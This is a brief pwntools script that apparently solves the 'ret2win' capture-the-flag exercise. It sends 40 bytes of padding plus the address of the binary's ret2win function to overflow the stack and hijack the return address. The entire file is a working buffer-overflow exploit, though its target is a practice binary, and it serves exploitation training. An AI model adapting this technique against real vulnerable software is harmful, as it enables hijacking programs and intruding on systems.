from pwn import *

bin="./ret2win"
p=process(bin)
e=ELF(bin)
context.binary=bin
win=e.symbols[b'ret2win']

payload=b'A'*40+p64(win)

p.recvuntil(b'> ')
p.sendline(payload)

output = p.recvall(timeout=1).decode()
print(output)
